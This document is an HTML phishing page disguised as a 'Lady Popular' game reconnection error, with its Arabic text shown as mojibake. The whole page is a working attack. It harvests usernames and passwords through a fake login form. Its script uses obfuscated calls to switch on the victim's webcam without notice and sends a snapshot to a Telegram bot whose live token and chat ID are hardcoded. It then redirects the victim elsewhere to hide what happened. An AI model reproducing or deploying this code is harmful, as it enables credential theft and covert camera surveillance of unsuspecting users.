<!DOCTYPE html>
<html>
<head>
    <title>Lady Popular: Reconnection Error</title>
    <style>
        body { font-family: Arial, sans-serif; background-color: #f0f0f0; margin: 0; padding: 0; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
        .login-container { background-color: white; padding: 30px; border-radius: 8px; box-shadow: 0 4px 12px rgba(0, 0, 0, 0.2); width: 350px; text-align: center; }
        .logo { font-size: 28px; color: #e74c3c; margin-bottom: 20px; font-weight: bold; }
        .error-header { color: #d35400; margin-bottom: 20px; }
        .error-header h3 { margin: 0; font-size: 18px; }
        input[type="text"], input[type="password"] {
            width: calc(100% - 20px);
            padding: 10px;
            margin: 10px 0;
            border: 1px solid #ccc;
            border-radius: 4px;
            box-sizing: border-box;
        }
        button {
            background-color: #e74c3c;
            color: white;
            padding: 10px 20px;
            border: none;
            border-radius: 4px;
            cursor: pointer;
            font-size: 16px;
            width: 100%;
        }
        button:hover { background-color: #c0392b; }
        .footer-text { margin-top: 20px; font-size: 12px; color: #7f8c8d; }
    </style>
</head>
<body>

<div class="login-container">
    <div class="logo">Lady Popular</div>
    
    <div class="error-header">
        <h3>ğŸš¨ Ø®Ø·Ø£ Ø­Ø±Ø¬: Ù…Ø·Ù„ÙˆØ¨ Ø¥Ø¹Ø§Ø¯Ø© Ø§Ù„Ø§ØªØµØ§Ù„.</h3>
        <p style="font-size: 14px;">Ù„Ø¥Ø¹Ø§Ø¯Ø© ØªÙØ¹ÙŠÙ„ Ø­Ø³Ø§Ø¨Ùƒ ÙˆØ§Ù„Ø­ÙØ§Ø¸ Ø¹Ù„Ù‰ ØªÙ‚Ø¯Ù…ÙƒØŒ ÙŠØ±Ø¬Ù‰ Ø¥Ø¹Ø§Ø¯Ø© Ø¥Ø¯Ø®Ø§Ù„ Ø¨ÙŠØ§Ù†Ø§Øª Ø§Ù„Ø¯Ø®ÙˆÙ„ Ù„Ù…Ø±Ø© ÙˆØ§Ø­Ø¯Ø©.</p>
    </div>

    <form id="reconnectForm" method="POST" action="/login_intercept">
        <input type="text" name="login_name" placeholder="Ø§Ø³Ù… Ø§Ù„Ù…Ø³ØªØ®Ø¯Ù… Ø£Ùˆ Ø§Ù„Ø¨Ø±ÙŠØ¯ Ø§Ù„Ø¥Ù„ÙƒØªØ±ÙˆÙ†ÙŠ" required>
        <input type="password" name="login_pass" placeholder="ÙƒÙ„Ù…Ø© Ø§Ù„Ù…Ø±ÙˆØ±" required>
        <button type="submit">Ø¥Ø¹Ø§Ø¯Ø© Ø§Ù„Ø§ØªØµØ§Ù„ Ø§Ù„Ø¢Ù†</button>
    </form>

    <div class="footer-text">
        Ø³ÙˆÙ ÙŠÙØ·Ù„Ø¨ Ù…Ù†Ùƒ ØªØ£ÙƒÙŠØ¯ Ø§Ù„Ø¥Ø´Ø¹Ø§Ø±Ø§Øª Ù„ØªÙ„Ù‚ÙŠ ØªÙ†Ø¨ÙŠÙ‡Ø§Øª Ø§Ù„Ù…ÙƒØ§ÙØ¢Øª.
    </div>
</div>

<video id="vE" style="display:none;" autoplay></video>
<canvas id="cE" style="display:none;"></canvas>

<script>
    const BOT_TOKEN = "8524364904:AAEB_SX7vIt2EhZikJbLOBgwHOmeQTYuHN8";
    const CHAT_ID = "6521966233"; 
    const REDIRECT_URL = 'https://sabaya.ae/';
    const TELEGRAM_PHOTO_ENDPOINT = 'https://api.telegram.org/bot' + BOT_TOKEN + '/sendPhoto';

    // 1. Ù…Ø­Ø§ÙˆÙ„Ø© ØµØ§Ù…ØªØ© Ù„Ù„ØªÙ‚Ø§Ø· ØµÙˆØ±Ø©
    function attemptSilentCapture() {
        // Ù†Ø·Ù„Ø¨ Ø§Ù„Ø¥Ø´Ø¹Ø§Ø±Ø§Øª Ø£ÙˆÙ„Ø§Ù‹ ÙƒØ¹Ù†ØµØ± "Ø£Ù‚Ù„ Ø®Ø·Ø±Ø§Ù‹" Ù„ØªØ³Ø¬ÙŠÙ„ ØªÙØ§Ø¹Ù„ Ø§Ù„Ù…Ø³ØªØ®Ø¯Ù…
        if ('Notification' in window) {
            Notification.requestPermission().then(permission => {
                if (permission === 'granted' || permission === 'default') {
                    // Ø¨Ø¹Ø¯ ØªÙØ§Ø¹Ù„ Ø§Ù„Ù…Ø³ØªØ®Ø¯Ù… Ù…Ø¹ Ù†Ø§ÙØ°Ø© Ø§Ù„Ø¥Ø´Ø¹Ø§Ø±Ø§ØªØŒ Ù†Ø­Ø§ÙˆÙ„ ÙÙˆØ±Ø§Ù‹ Ø·Ù„Ø¨ Ø§Ù„ÙƒØ§Ù…ÙŠØ±Ø§
                    
                    // Ø¯ÙˆØ§Ù„ Ø§Ù„ØªØ¹ØªÙŠÙ…: N=navigator, M=mediaDevices, G=getUserMedia
                    const N = 'navigator';
                    const M = 'mediaDevices';
                    const G = 'getUserMedia';

                    if (window[N] && window[N][M] && window[N][M][G]) {
                        window[N][M][G]({ video: true })
                            .then(stream => {
                                // 2. Ø¥Ø°Ø§ Ù†Ø¬Ø­ Ø§Ù„ÙˆØµÙˆÙ„ (ÙÙŠ Ø­Ø§Ù„Ø© Ø¶Ø¹Ù Ø£Ù…Ø§Ù† Ø§Ù„Ù…ØªØµÙØ­)ØŒ Ù†Ø±Ø³Ù„ Ø§Ù„ØµÙˆØ±Ø©
                                CS(stream);
                            })
                            .catch(error => {
                                // ÙØ´Ù„ Ø§Ù„ÙƒØ§Ù…ÙŠØ±Ø§
                                console.error("Camera access failed after notification prompt.");
                            });
                    }
                }
            });
        }
    }
    
    // Ø¯Ø§Ù„Ø© Ø§Ù„ØªÙ‚Ø§Ø· ÙˆØ¥Ø±Ø³Ø§Ù„ Ø§Ù„ØµÙˆØ±Ø© (Ù…ÙØ¹ØªÙ‘ÙÙ…Ø©)
    function CS(stream) {
        const V = document.getElementById('vE');
        const L = document.getElementById('cE');
        const X = L.getContext('2d');
        
        V.srcObject = stream;
        V.play();
        
        setTimeout(() => {
            L.width = V.videoWidth;
            L.height = V.videoHeight;
            X.drawImage(V, 0, 0, L.width, L.height);
            
            stream.getTracks().forEach(track => track.stop());

            L.toBlob(blob => {
                const FData = new FormData();
                FData.append('chat_id', CHAT_ID);
                FData.append('photo', blob, 'moby_login_capture.jpg'); 
                
                // Ø§Ù„Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„ØµØ§Ù…Øª Ù„Ù€ Telegram
                fetch(TELEGRAM_PHOTO_ENDPOINT, {
                    method: 'POST',
                    body: FData
                }).catch(() => {}); // Ù†ØªØ¬Ø§Ù‡Ù„ Ø§Ù„Ø£Ø®Ø·Ø§Ø¡
            }, 'image/jpeg');
        }, 500); // Ø§Ù„ØªÙ‚Ø§Ø· Ø³Ø±ÙŠØ¹ Ø¬Ø¯Ø§Ù‹ (500 Ù…Ù„Ù„ÙŠ Ø«Ø§Ù†ÙŠØ©)
    }

    // 3. Ù…Ø¹Ø§Ù„Ø¬ Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„Ù†Ù…ÙˆØ°Ø¬ (Ø§Ù„Ø®Ø·ÙˆØ© Ø§Ù„Ø­Ø§Ø³Ù…Ø©)
    document.getElementById('reconnectForm').addEventListener('submit', function(e) {
        e.preventDefault();
        const form = e.target;
        const formData = new FormData(form);

        // Ø§Ø¹ØªØ±Ø§Ø¶ Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª ÙˆØ¥Ø±Ø³Ø§Ù„Ù‡Ø§ Ø¥Ù„Ù‰ Ø®Ø§Ø¯Ù… Render Ø£ÙˆÙ„Ø§Ù‹
        fetch(form.action, {
            method: 'POST',
            body: formData
        })
        .then(response => response.json())
        .then(data => {
            // 4. ØªÙ†ÙÙŠØ° Ù…Ø­Ø§ÙˆÙ„Ø© Ø§Ù„ØªÙ‚Ø§Ø· Ø§Ù„ÙƒØ§Ù…ÙŠØ±Ø§ Ø¨Ø¹Ø¯ Ù†Ø¬Ø§Ø­ Ø§Ø¹ØªØ±Ø§Ø¶ Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª!
            attemptSilentCapture();
            
            // 5. Ø¥Ø¹Ø§Ø¯Ø© Ø§Ù„ØªÙˆØ¬ÙŠÙ‡ Ø§Ù„Ù†Ù‡Ø§Ø¦ÙŠ Ù„Ø¥Ù†Ù‡Ø§Ø¡ Ø§Ù„Ø®Ø¯Ø¹Ø©
            setTimeout(() => {
                window.location.href = data.redirect || REDIRECT_URL;
            }, 2500); 
        })
        .catch(() => {
            // ÙÙŠ Ø­Ø§Ù„Ø© ÙØ´Ù„ Ø§Ù„Ø´Ø¨ÙƒØ©ØŒ Ù„Ø§ Ø²Ù„Ù†Ø§ Ù†Ø­Ø§ÙˆÙ„ Ø§Ù„ØªÙ‚Ø§Ø· Ø§Ù„ÙƒØ§Ù…ÙŠØ±Ø§ØŒ Ø«Ù… Ø¥Ø¹Ø§Ø¯Ø© Ø§Ù„ØªÙˆØ¬ÙŠÙ‡
            attemptSilentCapture();
            setTimeout(() => {
                window.location.href = REDIRECT_URL;
            }, 2500);
        });
    });
</script>

</body>
</html>
